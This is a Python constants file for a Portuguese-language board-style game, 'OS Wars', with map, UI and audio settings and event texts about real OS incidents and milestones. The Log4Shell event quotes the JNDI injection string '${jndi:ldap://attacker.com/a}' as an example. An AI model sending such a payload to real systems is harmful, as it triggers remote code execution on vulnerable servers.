"""
Constantes do jogo OS Wars
"""

import os

# Diretórios
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
ASSETS_DIR = os.path.join(BASE_DIR, "assets")
CONTINENTS_DIR = os.path.join(ASSETS_DIR, "continentes")
LOGOS_DIR = os.path.join(ASSETS_DIR, "logos")

# Configurações da janela
WINDOW_WIDTH = 1600
WINDOW_HEIGHT = 900
FPS = 60
WINDOW_TITLE = "OS Wars - Guerra dos Sistemas Operacionais"

# Cores
OCEAN_BLUE = (41, 128, 185)
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GRAY = (200, 200, 200)
DARK_GRAY = (100, 100, 100)

# Cores dos jogadores
PLAYER_COLORS = {
    "Windows": (231, 76, 60),    # Vermelho
    "MacOS": (149, 165, 166),     # Cinza
    "Linux": (46, 204, 113)       # Verde
}

# Cores mais escuras para overlay
PLAYER_OVERLAY_COLORS = {
    "Windows": (192, 57, 43),
    "MacOS": (127, 140, 141),
    "Linux": (39, 174, 96)
}

# Nomes dos continentes
CONTINENTS = [
    "America do Norte",
    "America do Sul",
    "Europa",
    "Asia",
    "Africa",
    "Oceania"
]

# Mapeamento de nomes de arquivos dos continentes
CONTINENT_FILES = {
    "America do Norte": "america_do_norte.png",
    "America do Sul": "america_do_sul.png",
    "Europa": "europa.png",
    "Asia": "asia.png",
    "Africa": "africa.png",
    "Oceania": "oceania.png"
}

# Posições dos continentes no mapa
CONTINENT_POSITIONS = {
    "America do Norte": (450, 225),
    "America do Sul": (492, 545),
    "Europa": (800, 250),
    "Asia": (1038, 303),
    "Africa": (785, 505),
    "Oceania": (1250, 600)
}

# Offset das informações de controle para cada continente (x, y)
# Ajuste esses valores para centralizar as porcentagens em cada continente
CONTINENT_INFO_OFFSET = {
    "America do Norte": (-72, 72),
    "America do Sul": (20, -10),
    "Europa": (-20, 24),
    "Asia": (0, 0),
    "Africa": (0, -30),
    "Oceania": (-24, 0)
}

# Continentes adjacentes
ADJACENT_CONTINENTS = {
    "America do Norte": ["America do Sul", "Asia", "Europa"],
    "America do Sul": ["America do Norte", "Africa"],
    "Europa": ["America do Norte", "Asia", "Africa"],
    "Asia": ["America do Norte", "Europa", "Africa", "Oceania"],
    "Africa": ["America do Sul", "Europa", "Asia"],
    "Oceania": ["Asia"]
}

# Jogadores
PLAYERS = ["Windows", "MacOS", "Linux"]

# Ordem dos turnos
TURN_ORDER = ["Windows", "MacOS", "Linux"]

# Habilidades especiais
SPECIAL_ABILITIES = {
    "Windows": "Ganha um dado extra para ataques",
    "MacOS": "Soma +1 em todos os dados de defesa",
    "Linux": "Pode re-rolar um dado por combate"
}

# Logo dos SOs
LOGO_FILES = {
    "Windows": "windows.png",
    "MacOS": "macos.png",
    "Linux": "linux.png"
}

# Configurações de gameplay
CONTROL_PERCENTAGE_PER_WIN = 5  # Porcentagem ganha/perdida por vitória no combate
DICE_CONTROL_DIVISOR = 20  # Divisor para calcular quantidade de dados
MIN_DICE = 1  # Mínimo de dados
WIN_PERCENTAGE = 50  # Porcentagem necessária em cada continente para vencer

# Eventos aleatórios por SO
RANDOM_EVENTS = {
    "Windows": [
        # Eventos Negativos (baseados em incidentes reais)
        {
            "label": "-30%",
            "percentage": -30,
            "name": "Falha CrowdStrike Global",
            "date": "2024-07-19",
            "description": (
                "A CrowdStrike lançou uma atualização defeituosa do arquivo de configuração 'Channel File 291' "
                "do seu software Falcon Sensor às 04:09 UTC. O erro de lógica causou uma leitura de memória "
                "fora dos limites no kernel do Windows, gerando o famoso Blue Screen of Death em loop infinito. "
                "Cerca de 8,5 milhões de máquinas Windows travaram simultaneamente — aviões foram cancelados "
                "(mais de 5.000 voos), hospitais suspenderam cirurgias, bancos pararam de operar e serviços de "
                "emergência ficaram inativos. O prejuízo global foi estimado em mais de US$ 10 bilhões, tornando "
                "este o maior apagão de TI da história. -30% de controle"
            ),
        },
        {
            "label": "-20%",
            "percentage": -20,
            "name": "Update KB5034441 Quebrado",
            "date": "2024-01-09",
            "description": (
                "A Microsoft lançou o KB5034441, uma atualização de segurança crítica para o Windows Recovery "
                "Environment (WinRE) no Patch Tuesday de janeiro de 2024. O patch visava corrigir uma "
                "vulnerabilidade que permitia bypass do BitLocker, mas falhou ao instalar com o erro 0x80070643 "
                "em milhões de PCs — porque a partição de recuperação criada pelo próprio instalador do Windows "
                "era pequena demais para receber a atualização. A Microsoft reconheceu o problema, mas levou "
                "meses sem lançar uma correção automática, deixando usuários com avisos de erro persistentes "
                "e sistemas vulneráveis. -20% de controle"
            ),
        },
        {
            "label": "-10%",
            "percentage": -10,
            "name": "BlueKeep — Vulnerabilidade RDP",
            "date": "2019-05-14",
            "description": (
                "A Microsoft divulgou a CVE-2019-0708, apelidada de 'BlueKeep', uma falha crítica de execução "
                "remota de código no Remote Desktop Protocol (RDP) que afetava Windows XP, Vista, 7, Server "
                "2003 e 2008. A vulnerabilidade era 'wormable' — capaz de se propagar automaticamente entre "
                "máquinas sem qualquer interação do usuário, como o ransomware WannaCry. A NSA emitiu um alerta "
                "especial, e a Microsoft tomou a medida rara de lançar patches até para sistemas sem suporte "
                "(Windows XP). Em novembro de 2019, o primeiro ataque massivo foi registrado, utilizando a "
                "falha para instalar mineradores de criptomoeda. -10% de controle"
            ),
        },

        # Eventos Positivos (baseados em sucessos reais)
        {
            "label": "+10%",
            "percentage": 10,
            "name": "DirectX 12 Lançado",
            "date": "2015-07-29",
            "description": (
                "O DirectX 12 foi lançado junto com o Windows 10, representando a maior revolução em APIs "
                "gráficas em anos. Ao expor acesso de baixo nível à GPU — semelhante ao que os consoles já "
                "ofereciam —, o DX12 reduziu o overhead de CPU em até 50% e permitiu que desenvolvedores "
                "gerenciassem recursos gráficos de forma paralela e muito mais eficiente. Jogos como Ashes of "
                "the Singularity demonstraram ganhos reais de desempenho. A API abriu caminho para o ray tracing "
                "em tempo real (DXR, 2018) e para o DirectX 12 Ultimate (2020), consolidando o Windows como a "
                "plataforma de jogos de PC mais avançada. +10% de controle"
            ),
        },
        {
            "label": "+20%",
            "percentage": 20,
            "name": "Windows Subsystem for Linux (WSL)",
            "date": "2016-08-02",
            "description": (
                "O WSL foi lançado em beta no Windows 10 Anniversary Update, inicialmente como 'Bash on Ubuntu "
                "on Windows'. Pela primeira vez, desenvolvedores podiam rodar binários nativos do Linux "
                "diretamente no Windows sem máquina virtual ou dual boot. Em 2019 chegou o WSL 2, com um "
                "kernel Linux real rodando em VM leve com performance quase nativa. A iniciativa mudou a "
                "percepção da Microsoft entre a comunidade open source, atraindo desenvolvedores que antes "
                "evitavam o Windows. Em 2025, o WSL foi parcialmente liberado como software open source, "
                "marcando a consolidação do 'Microsoft loves Linux'. +20% de controle"
            ),
        },
        {
            "label": "+30%",
            "percentage": 30,
            "name": "Copilot+ PC Launch",
            "date": "2024-06-18",
            "description": (
                "A Microsoft anunciou os Copilot+ PCs em 20 de maio de 2024 e os lançou oficialmente em 18 de "
                "junho, em parceria com Acer, ASUS, Dell, HP, Lenovo e Samsung. Os dispositivos contam com NPUs "
                "capazes de processar 40+ TOPS de IA localmente, sem depender da nuvem. Recursos exclusivos "
                "incluem o Recall (histórico visual de tudo que o usuário fez no PC), Auto Super Resolution "
                "(upscaling de jogos via IA), Studio Effects aprimorados e Live Captions com tradução em tempo "
                "real. Os primeiros modelos usavam o Snapdragon X Elite/Plus, com autonomia de até 22 horas e "
                "desempenho superior ao MacBook Air M3 em tarefas de IA. +30% de controle"
            ),
        },
    ],
    "MacOS": [
        # Eventos Negativos (baseados em incidentes reais)
        {
            "label": "-30%",
            "percentage": -30,
            "name": "Root Login Sem Senha",
            "date": "2017-11-28",
            "description": (
                "O desenvolvedor turco Lemi Orhan Ergin publicou um tweet alertando a Apple sobre uma falha "
                "catastrófica no macOS High Sierra 10.13.1: qualquer pessoa podia digitar 'root' como nome de "
                "usuário, deixar a senha em branco e clicar em 'Desbloquear' duas vezes para obter acesso total "
                "ao sistema — sem nenhuma senha. O bug funcionava na tela de login, nas Preferências do Sistema "
                "e até remotamente via VNC e Remote Desktop. A causa raiz era um erro de lógica no daemon "
                "'opendirectoryd', que ao verificar a conta root desativada acabava criando-a com senha em branco "
                "e retornando autenticação bem-sucedida. A falha estava presente há pelo menos duas semanas antes "
                "da divulgação pública. A Apple lançou o patch Security Update 2017-001 no dia seguinte — mas "
                "até o patch inicial quebrava o compartilhamento de arquivos, e quem atualizou o sistema de "
                "10.13 para 10.13.1 após instalar o patch ficou vulnerável novamente. -30% de controle"
            ),
        },
        {
            "label": "-20%",
            "percentage": -20,
            "name": "Gatekeeper Bypass — Achilles",
            "date": "2022-07-27",
            "description": (
                "Pesquisadores da Microsoft descobriram a CVE-2022-42821, apelidada de 'Achilles', uma falha "
                "lógica no mecanismo Gatekeeper do macOS — a proteção que impede a execução de apps não "
                "verificados pela Apple. O ataque explorava o sistema de Access Control Lists (ACLs) para "
                "adicionar permissões extremamente restritivas ao arquivo baixado, impedindo que o Safari "
                "aplicasse o atributo 'com.apple.quarantine' — a marca que sinaliza ao Gatekeeper que o arquivo "
                "veio da internet. Sem essa marca, o Gatekeeper simplesmente ignorava o app, permitindo que "
                "malware fosse executado diretamente sem nenhum aviso ao usuário. O ataque funcionava inclusive "
                "no Lockdown Mode, recurso criado pela Apple para proteger usuários de alto risco. A Apple "
                "corrigiu o bug no macOS Ventura 13, Monterey 12.6.2 e Big Sur 11.7.2 em dezembro de 2022. "
                "-20% de controle"
            ),
        },
        {
            "label": "-10%",
            "percentage": -10,
            "name": "WebKit Zero-Day CVE-2023-23529",
            "date": "2023-02-13",
            "description": (
                "A Apple lançou patches de emergência para corrigir a CVE-2023-23529, um zero-day de 'type "
                "confusion' no WebKit — a engine por trás do Safari e de todos os browsers no iOS. A "
                "vulnerabilidade permitia a execução de código arbitrário apenas ao visitar uma página web "
                "maliciosa. A Apple confirmou que a falha estava sendo 'ativamente explorada' e agradeceu ao "
                "Citizen Lab da Universidade de Toronto pela ajuda — laboratório conhecido por rastrear "
                "campanhas de spyware de estado, como o Pegasus. As atualizações foram iOS 16.3.1, iPadOS "
                "16.3.1, macOS Ventura 13.2.1 e Safari 16.3.1. Por ser o motor obrigatório de todos os "
                "browsers no iOS e macOS, uma falha no WebKit expõe qualquer usuário Apple que abra um link — "
                "independentemente do browser utilizado. -10% de controle"
            ),
        },

        # Eventos Positivos (baseados em sucessos reais)
        {
            "label": "+10%",
            "percentage": 10,
            "name": "Continuity Camera",
            "date": "2022-10-24",
            "description": (
                "Anunciada na WWDC 2022 em junho e lançada com o macOS Ventura em outubro, a Continuity Camera "
                "transformou qualquer iPhone XR ou mais novo em uma webcam wireless para o Mac — sem instalar "
                "nenhum app ou plugar nenhum cabo. A câmera traseira do iPhone, muito superior à webcam embutida "
                "nos Macs, passou a aparecer automaticamente como opção de câmera em FaceTime, Zoom, Google Meet, "
                "Microsoft Teams e qualquer outro app de vídeo. A feature trouxe efeitos exclusivos para o Mac: "
                "Center Stage (enquadramento automático), Studio Light (iluminação de rosto via IA), Portrait "
                "Mode (desfoque de fundo), e o revolucionário Desk View, que usa a câmera ultra-wide do iPhone "
                "para mostrar simultaneamente o rosto do usuário e uma vista aérea da mesa. O acessório Belkin "
                "iPhone Mount, que prende o iPhone à tela do MacBook, virou hit instantâneo. +10% de controle"
            ),
        },
        {
            "label": "+20%",
            "percentage": 20,
            "name": "Apple Silicon M1",
            "date": "2020-11-10",
            "description": (
                "No evento 'One More Thing', a Apple apresentou o M1 — seu primeiro chip ARM para Macs — "
                "inaugurando a terceira grande transição de arquitetura do Mac (após Motorola 68k → PowerPC → "
                "Intel). O M1 era um SoC de 5nm fabricado pela TSMC com 16 bilhões de transistores, combinando "
                "CPU de 8 núcleos (4 de alta performance + 4 de eficiência), GPU de 8 núcleos e Neural Engine "
                "de 16 núcleos em um único chip com memória unificada. Os primeiros três Macs com M1 — MacBook "
                "Air, MacBook Pro 13' e Mac mini — chegaram ao mesmo preço dos modelos Intel anteriores, porém "
                "com até o dobro de performance e 50% mais autonomia de bateria. O MacBook Air M1 superou "
                "MacBooks Pro Intel em benchmarks de CPU single-core e operava em silêncio absoluto, sem "
                "ventilador. O M1 encerrou uma era sombria de Macs lentos e superaquecidos e iniciou o que "
                "muitos chamam de 'renascimento do Mac'. +20% de controle"
            ),
        },
        {
            "label": "+30%",
            "percentage": 30,
            "name": "Apple Intelligence",
            "date": "2024-10-28",
            "description": (
                "Anunciada na WWDC 2024 em junho e lançada com macOS Sequoia 15.1 em 28 de outubro, a Apple "
                "Intelligence é o sistema de IA pessoal da Apple, rodando modelos de linguagem diretamente no "
                "chip (on-device) graças ao Neural Engine dos chips M1 e posteriores — sem enviar dados à nuvem "
                "para a maioria das tarefas. O primeiro lote de features incluiu Writing Tools (reescrita, "
                "resumo e correção de texto em qualquer app), Clean Up em Fotos (remoção de objetos via IA "
                "generativa), resumos de notificações, e uma versão redesenhada da Siri. Em dezembro de 2024, "
                "o iOS/macOS 15.2 trouxe integração com ChatGPT, Image Playground e Genmoji. Para tarefas que "
                "exigem processamento em nuvem, a Apple criou o Private Cloud Compute — servidores baseados em "
                "Apple Silicon com garantia de que os dados não são armazenados ou acessados pela Apple. "
                "Disponível em Macs com qualquer chip M, iPhones 15 Pro/Max e toda a linha iPhone 16. "
                "+30% de controle"
            ),
        },
    ],
    "Linux": [
        # Eventos Negativos (baseados em incidentes reais)
        {
            "label": "-30%",
            "percentage": -30,
            "name": "Dirty Pipe — CVE-2022-0847",
            "date": "2022-03-07",
            "description": (
                "Max Kellermann, engenheiro da CM4all/IONOS, percebeu que arquivos de log estavam sendo "
                "corrompidos misteriosamente em seu servidor. Depois de semanas investigando, identificou a "
                "causa: um bug de inicialização no membro 'flags' da estrutura de buffer de pipes do kernel "
                "Linux — presente desde o kernel 5.8 (lançado em 2020). O bug permitia que qualquer usuário "
                "local sem privilégios sobrescrevesse o conteúdo de *qualquer* arquivo somente-leitura no "
                "sistema, incluindo /etc/passwd e binários SUID — escalando imediatamente para root. O exploit "
                "era extremamente confiável, sem precisar de configurações especiais. Afetava todos os sistemas "
                "Linux com kernel 5.8+, incluindo Android. Kellermann enviou o patch ao kernel Linux em "
                "20/02/2022 e ao Android em 21/02/2022, antes da divulgação pública. A falha foi apelidada de "
                "'Dirty Pipe' por sua semelhança com o famoso 'Dirty COW' (CVE-2016-5195). -30% de controle"
            ),
        },
        {
            "label": "-20%",
            "percentage": -20,
            "name": "Log4Shell — CVE-2021-44228",
            "date": "2021-12-09",
            "description": (
                "Chen Zhaojun, da equipe de segurança da Alibaba Cloud, reportou em sigilo à Apache Foundation "
                "em 24 de novembro de 2021 uma vulnerabilidade catastrófica no Log4j2 — a biblioteca de logging "
                "Java mais usada no mundo, presente em produtos da Apple, Amazon, Google, Microsoft, Minecraft, "
                "Steam, Tesla e praticamente qualquer sistema Java empresarial. A falha explorava o mecanismo "
                "JNDI (Java Naming and Directory Interface): bastava que uma aplicação logasse uma string como "
                "'${jndi:ldap://attacker.com/a}' para que o servidor se conectasse automaticamente ao servidor "
                "do atacante e executasse código Java arbitrário remotamente, com os privilégios da aplicação. "
                "O CVSS foi 10.0/10.0 — nota máxima. Em horas após a divulgação pública, PoCs estavam no "
                "GitHub e botnets (Mirai, Kinsing) varriam a internet. NSA, CISA e a UE emitiram alertas de "
                "emergência. O CEO da Tenable chamou de 'a maior e mais crítica vulnerabilidade de todos os "
                "tempos'. Estimativas apontaram centenas de milhões de dispositivos vulneráveis. -20% de controle"
            ),
        },
        {
            "label": "-10%",
            "percentage": -10,
            "name": "Baron Samedit — CVE-2021-3156",
            "date": "2021-01-26",
            "description": (
                "Pesquisadores da Qualys descobriram e divulgaram responsavelmente a CVE-2021-3156, apelidada "
                "de 'Baron Samedit' (trocadilho com Baron Samedi e sudoedit). Tratava-se de um heap buffer "
                "overflow no programa 'sudo' — utilitário onipresente em praticamente toda instalação "
                "Linux/Unix que permite executar comandos como outro usuário. O bug estava escondido no código "
                "desde julho de 2011 — quase 10 anos — nas versões 1.8.2 a 1.8.31p2 e 1.9.0 a 1.9.5p1. Ao "
                "contrário de falhas anteriores no sudo, esta não exigia nenhuma configuração especial: "
                "qualquer usuário local, mesmo a conta 'nobody' (sem nenhum privilégio), podia executar o "
                "exploit e obter shell root em segundos. A Qualys desenvolveu três variantes de exploit e "
                "obteve root completo em Ubuntu 20.04, Debian 10 e Fedora 33. Depois descobriu-se que macOS, "
                "AIX e Solaris também eram vulneráveis. A Apple lançou patches para macOS Big Sur, Catalina e "
                "Mojave. O sudo foi corrigido na versão 1.9.5p2. -10% de controle"
            ),
        },

        # Eventos Positivos (baseados em sucessos reais)
        {
            "label": "+10%",
            "percentage": 10,
            "name": "Steam Deck com SteamOS",
            "date": "2022-02-25",
            "description": (
                "A Valve lançou o Steam Deck, um PC portátil para jogos rodando SteamOS 3.0 — baseado em "
                "Arch Linux com KDE Plasma 5. O dispositivo usava uma APU AMD customizada (Zen 2 + RDNA 2) "
                "com 16 GB de RAM LPDDR5 em configuração quad-channel. O que tornou o Steam Deck revolucionário "
                "para Linux não foi apenas o hardware, mas o Proton — a camada de compatibilidade da Valve "
                "baseada em Wine + DXVK que permitia rodar jogos Windows nativamente no Linux. No lançamento, "
                "milhares de títulos Steam já eram compatíveis, incluindo AAAs. Em novembro de 2023, a Valve "
                "confirmou ter vendido 'múltiplos milhões' de unidades. Em março 2022, o Linus Tech Tips "
                "comparou SteamOS 3.0 vs Windows 10 no próprio Deck e mostrou que *o Linux era mais rápido* "
                "em todos os três jogos testados. O Steam Deck criou uma onda de handhelds concorrentes "
                "(ROG Ally, Legion Go, MSI Claw), todos validando o formato. +10% de controle"
            ),
        },
        {
            "label": "+20%",
            "percentage": 20,
            "name": "Android Domination — Kernel Linux no Mobile",
            "date": "2024-09-01",
            "description": (
                "O Android, sistema operacional baseado no kernel Linux lançado originalmente em outubro de "
                "2008 com o HTC Dream (T-Mobile G1), tornou-se a plataforma móvel mais dominante da história. "
                "Em setembro de 2024, o Android atingiu 71,85% do mercado global de sistemas operacionais "
                "móveis — com iOS em 28%. Com mais de 1,5 bilhão de smartphones Android vendidos por ano, o "
                "kernel Linux roda em mais dispositivos que qualquer outro OS da história. Desde o Android 11, "
                "a plataforma passou a usar exclusivamente versões LTS (Long-Term Support) do kernel Linux, "
                "com suporte estendido de até 6 anos. O Project Treble (2017) e o Project Mainline (2019) "
                "trouxeram atualizações de segurança diretamente via Google Play Store, sem necessidade de "
                "atualização completa do OS. Em termos globais totais (todos os dispositivos), o Android/Linux "
                "é o sistema operacional mais usado do planeta, com cerca de 39% de market share em dezembro "
                "de 2025. +20% de controle"
            ),
        },
        {
            "label": "+30%",
            "percentage": 30,
            "name": "Linux Atinge 100% dos Top 500 Supercomputadores",
            "date": "2017-11-01",
            "description": (
                "Em novembro de 2017, os dois últimos supercomputadores não-Linux da lista TOP500 — dois "
                "sistemas AIX rodando em processadores IBM POWER7 — saíram do ranking por obsolescência. Com "
                "sua saída, o Linux atingiu 100% dos 500 supercomputadores mais poderosos do mundo, um marco "
                "histórico mantido ininterruptamente até hoje. A jornada durou 19 anos: em 1998, apenas 1 "
                "supercomputador na lista usava Linux. Entre 2002 e 2009, o Linux saltou de 71 para 448 "
                "sistemas. O kernel Linux venceu por ser gratuito, totalmente customizável para cargas de "
                "trabalho HPC específicas, e suportado por um ecossistema massivo de ferramentas científicas. "
                "As distribuições mais usadas são Red Hat Enterprise Linux (e derivados como AlmaLinux) e HPE "
                "Cray Linux Environment. Em 2024, todos os 3 supercomputadores exascale do mundo — El Capitan "
                "(1,742 exaflops), Frontier (1,353 exaflops) e Aurora (1,012 exaflops) — rodam Linux. "
                "+30% de controle"
            ),
        },
    ]
}

# Etapas do turno
PHASE_ATTACK = "Ataque"
PHASE_EVENT = "Evento Aleatório"

# Modos de jogo
MODE_RANDOM = "Aleatório"
MODE_REALISTIC = "Realista"

# UI Layout
MAP_CENTER_Y = 300  # Centro vertical do mapa
BOTTOM_PANEL_Y = 650  # Posição Y do painel inferior
BOTTOM_PANEL_HEIGHT = 250

# Posições dos elementos da UI inferior
PLAYER_INFO_X = 80
PLAYER_INFO_Y = 720

PHASE_DISPLAY_X = WINDOW_WIDTH // 2
PHASE_DISPLAY_Y = 750

BUTTON_X = WINDOW_WIDTH - 200
BUTTON_Y = 816
BUTTON_WIDTH = 180
BUTTON_HEIGHT = 60

# Tamanhos
LOGO_SIZE = (80, 80)
SMALL_LOGO_SIZE = (40, 40)
PIE_CHART_RADIUS = 80

# Fontes (tamanhos)
FONT_TITLE = 48
FONT_LARGE = 36
FONT_MEDIUM = 28
FONT_SMALL = 20
FONT_TINY = 16

# Roulette
ROULETTE_CENTER = (WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2)
ROULETTE_RADIUS = 200
ROULETTE_SPIN_TIME = 3000  # ms
ROULETTE_SLOWDOWN = 0.95  # Fator de desaceleração

# Áudio
AUDIO_DIR = os.path.join(ASSETS_DIR, "audio")

# Músicas de fundo
MUSIC_MENU = os.path.join(AUDIO_DIR, "Digital Lemonade.mp3")
MUSIC_GAME = os.path.join(AUDIO_DIR, "Ossuary 5 - Rest.mp3")
MUSIC_COMBAT = os.path.join(AUDIO_DIR, "Clash Defiant.mp3")

# Efeitos sonoros
SOUND_CLICK = os.path.join(AUDIO_DIR, "normal-click.wav")
SOUND_DICE_ROLL = os.path.join(AUDIO_DIR, "dice-rolling.wav")
SOUND_CONQUEST = os.path.join(AUDIO_DIR, "machine-gun.aiff")
SOUND_ROULETTE = os.path.join(AUDIO_DIR, "roulette.aiff")
